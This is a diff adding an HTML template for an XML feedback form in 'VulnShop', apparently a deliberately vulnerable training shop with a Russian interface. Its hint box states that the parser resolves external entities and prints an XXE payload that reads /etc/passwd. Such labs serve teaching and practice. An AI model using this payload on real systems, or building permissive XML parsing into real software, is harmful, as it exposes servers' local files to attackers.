@@ -1,0 +1,35 @@
+{% extends "base.html" %}
+{% block title %}Обратная связь (XML) — VulnShop{% endblock %}
+{% block content %}
+<section class="form-page form-page-wide">
+  <h1>Отзыв в формате XML</h1>
+  <div class="hint-box">
+    <p class="hint-box-title">XXE (XML External Entity)</p>
+    <p>Парсер разрешает внешние сущности. Пример для чтения локального файла:</p>
+    <pre class="payload">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
+&lt;feedback&gt;
+  &lt;name&gt;tester&lt;/name&gt;
+  &lt;message&gt;&amp;xxe;&lt;/message&gt;
+&lt;/feedback&gt;</pre>
+    <p><a href="{{ url_for('hints') }}#xxe">Подробнее →</a></p>
+  </div>
+  <form method="post" class="stack-form">
+    <label>
+      XML-отзыв
+      <textarea name="xml" rows="8" placeholder="&lt;feedback&gt;&lt;name&gt;...&lt;/name&gt;&lt;message&gt;...&lt;/message&gt;&lt;/feedback&gt;"></textarea>
+    </label>
+    <label>
+      ...или файл .xml
+      <input type="file" name="xml_file" accept=".xml">
+    </label>
+    <button type="submit">Отправить</button>
+  </form>
+  {% if error %}
+  <p class="error">{{ error }}</p>
+  {% endif %}
+  {% if result %}
+  <pre class="output">{{ result }}</pre>
+  {% endif %}
+</section>
+{% endblock %}
